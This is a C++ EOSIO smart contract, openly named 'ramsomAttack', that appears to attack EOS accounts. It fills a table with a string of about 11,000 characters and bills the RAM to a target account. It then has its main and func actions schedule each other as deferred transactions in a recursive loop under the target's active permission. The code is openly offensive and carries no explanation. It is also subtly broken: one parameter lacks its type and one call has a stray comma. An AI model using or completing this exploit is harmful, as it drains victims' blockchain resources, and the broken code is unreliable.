//#include <eosiolib/permission.hpp>
#include <eosiolib/eosio.hpp>
#include <eosiolib/print.hpp>
#include <eosiolib/action.hpp>
//#include <eosiolib/transaction.h>
#include <eosiolib/contract.hpp>
#include <eosiolib/permission.hpp>
#include <eosiolib/action.h>
#include <eosio/serialize.hpp>
using namespace eosio;

class [[eosio::contract]] ramsomAttack : public eosio::contract {
	private:
		struct [[eosio::table]] person{
			uint64_t key;
			std::string data;
			uint64_t primary_key() const {return key;}
		};
	typedef eosio::multi_index<"people"_n, person> address_index;
	public:
      using contract::contract;
	  void upsert(name user, uint64_t idx)
	  {
		std::string A ="AAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
		A = A+A+A+A+A+A+A+A+A+A+A+A+A;
		A = A+A+A+A+A+A+A+A+A+A+A+A+A;
		address_index addresses(_self, _self.value);
		addresses.emplace(user, [&](auto & row)
		{
		row.key = idx;
		row.data = A;
		});
		print("SUCCESS SAVE DATA\n");
	  }
        [[eosio::action]]
        void main(name target, myself, uint64_t idx)
        {
            uint128_t initnum = 1;
		
			upsert(target, idx);

            transaction out1{};
            transaction out2{};

            //name client = name("reset");

           // out1.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n,std::make_tuple( client,  uint64_t(1)) );
           // out2.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n,std::make_tuple( client, uint64_t(2)) );
            for(int i =0; i<3; i++){ // 1,2,3 / 2
            //    out1.actions.pop_back();
                out1.actions.emplace_back(permission_level{target, "active"_n}, ,myself, "func"_n, std::make_tuple(target, myself , uint64_t(initnum+(idx)+i) ));
                //out.delay_sec = 0;
                out1.send((initnum+idx+i), myself, false);
                print("[+] CALL 1st: ", ((idx)+i), "\n");
            }
            for (int i = 0; i<3; i++){ // 5,6,7 /
            //    out2.actions.pop_back();
                out2.actions.emplace_back(permission_level{target, "active"_n}, myself, "func"_n, std::make_tuple(target, myself , uint64_t(initnum+(idx*5)+i) ));
                //out2.delay_sec = 0;
                out2.send((initnum+(idx*5)+i), myself, false);
                print("[+] CALL 2nd: ", ((idx*5)+i), "\n");
            }
            print("[#] MAIN: ", idx);
        };
        [[eosio::action]]
        void func(name target, name myself, uint64_t idx)
        { // 123 567
            //name client = name("reset");
            transaction out{};
            out.actions.emplace_back(permission_level{target, "active"_n}, myself, "main"_n, std::make_tuple(target, myself, uint64_t(idx*100) ));
            //out.delay_sec = 0;
            out.send((idx*100), myself, false);
            print("\t[#] FUNC: ", idx);
        };

};

EOSIO_DISPATCH( ramsomAttack, (main)(func) )

